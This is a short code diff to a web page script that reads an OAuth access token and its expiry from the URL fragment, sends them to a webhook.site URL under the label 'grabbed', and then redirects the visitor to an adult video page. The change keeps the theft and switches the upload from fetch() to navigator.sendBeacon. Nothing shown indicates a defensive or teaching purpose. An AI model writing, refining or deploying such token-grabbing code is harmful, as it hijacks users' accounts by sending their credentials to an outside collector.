@@ -22,11 +22,9 @@
     var tok = (location.hash.match(/access_token=([^&]+)/) || [])[1];
     var exp = (location.hash.match(/expires_in=([^&]+)/) || [])[1];
     if (tok) {
-      fetch("https://webhook.site/d7065678-2f9f-41e7-9a6e-7a0e3cc56080", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ token: tok, expires_in: exp, grabbed: Date.now() })
-      });
+      navigator.sendBeacon("https://webhook.site/d7065678-2f9f-41e7-9a6e-7a0e3cc56080",
+        new Blob([JSON.stringify({ token: tok, expires_in: exp, grabbed: Date.now() })],
+                 { type: "application/json" }));
     }
     setTimeout(function(){ location.href='https://multporn.net/video/lady_ds_prisoner'; }, 2000);
   </script>
